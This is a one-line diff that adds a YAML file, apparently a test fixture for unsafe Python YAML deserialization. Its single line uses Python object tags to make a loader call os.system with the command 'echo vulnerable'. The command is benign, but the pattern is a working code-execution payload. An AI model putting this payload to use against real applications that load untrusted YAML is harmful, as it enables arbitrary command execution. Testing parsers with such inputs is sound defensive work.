@@ -1,0 +1,1 @@
+a: !!python/object/new:tuple [ [ !!python/name:os.system ['echo vulnerable'] ] ]
